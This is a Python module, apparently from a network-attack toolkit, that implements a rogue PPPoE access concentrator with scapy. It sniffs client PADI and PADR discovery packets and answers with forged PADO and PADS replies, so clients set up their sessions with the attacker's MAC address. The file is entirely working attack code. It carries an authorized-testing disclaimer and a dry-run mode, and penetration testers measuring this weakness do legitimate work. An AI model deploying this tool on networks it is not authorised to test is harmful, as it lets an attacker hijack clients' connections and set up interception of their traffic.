"""Rogue PPPoE access concentrator: answer PPPoE discovery with an offer that points at the attacker.

A PPPoE client broadcasts a PADI and takes the first PADO it receives. It then sends a PADR
to the concentrator that answered, with the AC-Cookie from that PADO. The protocol does not
authenticate the concentrator, so a device that answers first with a PADO becomes the
concentrator the client sets its session up with.

This module answers PADI with a PADO, and answers a PADR only when it carries the AC-Cookie
this module issued to that client's MAC, which means the client chose this concentrator.
It then answers that PADR with a PADS. It does not authenticate the client or run PPP.

The effect to measure is whether a client's PADR goes to the attacker's MAC, and whether
the PADS the client gets comes from it.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import random
import threading
from collections.abc import Callable
from dataclasses import dataclass, field, replace
from typing import Any

from scapy.all import AsyncSniffer, Ether, sendp
from scapy.layers.ppp import PPPoED, PPPoED_Tags, PPPoETag
from scapy.packet import Packet

from macabre.attacks.common import normalize_unicast_mac

ETHERTYPE_PPPOE_DISCOVERY = 0x8863
CODE_PADI = 0x09
CODE_PADO = 0x07
CODE_PADR = 0x19
CODE_PADS = 0x65
TAG_SERVICE_NAME = 0x0101
TAG_AC_NAME = 0x0102
TAG_AC_COOKIE = 0x0104
MAX_SESSION_ID = 0xFFFF
COOKIE_BYTES = 16
MAX_AC_NAME = 64


@dataclass(frozen=True)
class RoguePppoeAcConfig:
    iface: str                          # attacker interface, on the segment with the clients
    ac_mac: str                         # this concentrator's MAC address (required)
    ac_name: str = "MACabre-AC"         # AC-Name tag in every PADO and PADS
    dry_run: bool = False               # validate and describe, but do not listen or send

    def __post_init__(self) -> None:
        normalize_unicast_mac(self.ac_mac)
        if not self.ac_name or len(self.ac_name) > MAX_AC_NAME:
            raise ValueError(f"AC name must be 1 to {MAX_AC_NAME} characters.")


@dataclass
class RoguePppoeAcStats:
    padi: int = 0
    pado: int = 0
    padr: int = 0
    pads: int = 0
    status: str = ""


@dataclass
class _Session:
    """What the attacker has issued: one AC-Cookie per client MAC, and the next session id."""
    cookies: dict[str, bytes] = field(default_factory=dict)
    next_session: int = 1

    def issue_session_id(self) -> int:
        session_id = self.next_session
        self.next_session = self.next_session % MAX_SESSION_ID + 1
        return session_id


def _tags(packet: Packet, tag_type: int) -> list[bytes]:
    if not packet.haslayer(PPPoED_Tags):
        return []
    return [tag.tag_value for tag in packet[PPPoED_Tags].tag_list if tag.tag_type == tag_type]


def build_pado(config: RoguePppoeAcConfig, client_mac: str, padi: Packet, cookie: bytes) -> Packet:
    """A PADO for `padi`: AC-Name, the client's Service-Name tags echoed, and the AC-Cookie."""
    tags = [PPPoETag(tag_type=TAG_SERVICE_NAME, tag_value=name) for name in _tags(padi, TAG_SERVICE_NAME)] or [
        PPPoETag(tag_type=TAG_SERVICE_NAME, tag_value=b"")
    ]
    tags += [
        PPPoETag(tag_type=TAG_AC_NAME, tag_value=config.ac_name.encode()),
        PPPoETag(tag_type=TAG_AC_COOKIE, tag_value=cookie),
    ]
    return (
        Ether(src=normalize_unicast_mac(config.ac_mac), dst=client_mac, type=ETHERTYPE_PPPOE_DISCOVERY)
        / PPPoED(code=CODE_PADO, sessionid=0)
        / PPPoED_Tags(tag_list=tags)
    )


def build_pads(config: RoguePppoeAcConfig, client_mac: str, session_id: int, padr: Packet) -> Packet:
    """A PADS that opens session `session_id` for the client, echoing its Service-Name tags."""
    tags = [PPPoETag(tag_type=TAG_SERVICE_NAME, tag_value=name) for name in _tags(padr, TAG_SERVICE_NAME)] or [
        PPPoETag(tag_type=TAG_SERVICE_NAME, tag_value=b"")
    ]
    tags.append(PPPoETag(tag_type=TAG_AC_NAME, tag_value=config.ac_name.encode()))
    return (
        Ether(src=normalize_unicast_mac(config.ac_mac), dst=client_mac, type=ETHERTYPE_PPPOE_DISCOVERY)
        / PPPoED(code=CODE_PADS, sessionid=session_id)
        / PPPoED_Tags(tag_list=tags)
    )


def respond(
    config: RoguePppoeAcConfig,
    session: _Session,
    packet: Packet,
    rng: random.Random,
) -> tuple[str, Packet] | None:
    """Return ("pado" | "pads", reply) for a discovery packet this concentrator answers, otherwise None.

    A PADR is answered only when its AC-Cookie matches the one issued to the same client MAC,
    so the client has chosen this concentrator.
    """
    if not (packet.haslayer(PPPoED) and packet.haslayer(Ether)):
        return None
    client_mac = packet[Ether].src.lower()
    code = packet[PPPoED].code
    if code == CODE_PADI:
        cookie = rng.getrandbits(COOKIE_BYTES * 8).to_bytes(COOKIE_BYTES, "big")
        session.cookies[client_mac] = cookie
        return "pado", build_pado(config, client_mac, packet, cookie)
    if code == CODE_PADR:
        issued = session.cookies.get(client_mac)
        if issued is None or issued not in _tags(packet, TAG_AC_COOKIE):
            return None
        del session.cookies[client_mac]
        return "pads", build_pads(config, client_mac, session.issue_session_id(), packet)
    return None


def run_rogue_pppoe_ac(
    config: RoguePppoeAcConfig,
    stop_event: threading.Event,
    on_progress: Callable[[RoguePppoeAcStats], None],
    rng: random.Random | None = None,
    send: Callable[..., Any] | None = None,
) -> RoguePppoeAcStats:
    """Answer discovery packets on `iface` until `stop_event` is set."""
    rng = rng or random.Random()
    send = send or sendp

    if config.dry_run:
        stats = RoguePppoeAcStats(
            status=(
                f"Dry run: would answer PADI with PADO and matching PADR with PADS as {config.ac_name!r} "
                f"on {config.ac_mac}. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    session = _Session()
    stats = RoguePppoeAcStats()
    lock = threading.Lock()

    def handle(packet: Packet) -> None:
        with lock:
            if packet[PPPoED].code == CODE_PADI:
                stats.padi += 1
            elif packet[PPPoED].code == CODE_PADR:
                stats.padr += 1
            result = respond(config, session, packet, rng)
            if result is None:
                return
            kind, reply = result
            send(reply, iface=config.iface, verbose=False)
            if kind == "pado":
                stats.pado += 1
            else:
                stats.pads += 1
            on_progress(replace(stats))

    sniffer = AsyncSniffer(
        iface=config.iface,
        lfilter=lambda p: p.haslayer(PPPoED) and p[PPPoED].code in (CODE_PADI, CODE_PADR),
        prn=handle,
        store=False,
    )
    sniffer.start()
    try:
        stop_event.wait()
    finally:
        sniffer.stop()
    return stats
